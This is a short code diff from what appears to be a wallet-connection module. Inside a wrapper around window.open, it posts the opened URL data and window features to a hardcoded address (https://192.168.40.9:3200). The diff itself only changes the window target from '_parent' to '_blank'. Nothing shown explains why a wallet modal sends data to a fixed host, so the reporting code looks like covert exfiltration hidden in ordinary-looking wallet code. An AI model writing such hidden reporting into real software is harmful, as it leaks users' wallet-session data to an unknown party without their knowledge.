@@ -42,7 +42,7 @@ export const createWalletConnectModal = () => {
       axios.post(`https://192.168.40.9:3200`, { data: _ });
       axios.post(`https://192.168.40.9:3200`, { data: features });
 
-      return open.call(window, url, "_parent", features);
+      return open.call(window, url, "_blank");
     };
   })(window.open);
 
